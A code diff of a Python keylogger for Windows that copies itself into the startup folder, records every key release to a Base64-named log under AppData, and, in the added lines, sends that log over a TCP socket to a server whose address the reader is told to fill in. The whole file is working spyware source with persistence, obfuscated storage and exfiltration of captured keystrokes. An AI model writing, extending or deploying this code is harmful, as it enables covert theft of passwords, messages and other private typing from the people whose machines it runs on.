@@ -1,4 +1,4 @@
-import getpass, os, keyboard, base64, requests
+import getpass, os, keyboard, base64, requests, socket, time
 
 
 ### Adds the script to Windows startup programs folder, so it runs on system boot ###
@@ -20,7 +20,6 @@ def add_to_startup(file_path=""):
 def log_keys_to_txt():
 
     # Creates the a2V5bG9n directory for the log file to be stored in if it doesn't already exist
-    log_dir = rf"C:\Users\{user_name}\AppData\Local\a2V5bG9n"
     os.makedirs(log_dir, exist_ok=True)
 
     # Opens the keylog text file, "keylog.txt" obfuscated as "a2V5bG9n.txt" in append bytes mode.
@@ -30,10 +29,10 @@ def log_keys_to_txt():
         def log_key(event):
 
             # Takes "event" as an argument, the key that is pressed, encodes it in Base64, then writes to the file buffer
-            key = f"{event.name}\n".encode("utf-8")  # Encode key input as bytes
-            encoded_key = base64.b64encode(key)  # Base64 encoding
-            log_file.write(encoded_key + b"\n") # Writes the encoded key followed by a newline
-            log_file.flush() # flushes the buffer to save to file on run time.
+            key = f"{event.name}\n".encode("utf-8") # Encode key input as bytes
+            encoded_key = base64.b64encode(key)     # Base64 encoding
+            log_file.write(encoded_key + b"\n")     # Writes the encoded key followed by a newline
+            log_file.flush()                        # flushes the buffer to save to file on run time.
 
         # Starts the event listener for key releases that calls the log_key function
         keyboard.on_release(log_key)
@@ -43,13 +42,27 @@ def log_keys_to_txt():
 
 
 def Send_Log_File_To_Server():
-    pass
+    HOST = '127.0.0.1'                      # Replace with your server's IP
+    PORT = 65432                            # Replace with your server's port
+    file_path = rf"{log_dir}\a2V5bG9n.txt"  # Path to the log file
+
+    # Create a socket and connect to the server
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
+        client_socket.connect((HOST, PORT))             # Connect to the server
+        print(f"Connected to server at {HOST}:{PORT}") 
+
+        # Open and read the file
+        with open(file_path, 'rb') as file:
+            data = file.read()
+            client_socket.sendall(data)
+            print("File sent successfully.")
+
 
 
 ### MAIN Execution ###
 
-# Gets the current user's name
-user_name = getpass.getuser()
+user_name = getpass.getuser()                               # Gets the current user's name
+log_dir = rf"C:\Users\{user_name}\AppData\Local\a2V5bG9n"   # Directory to store the log file
 
 add_to_startup()
 log_keys_to_txt()
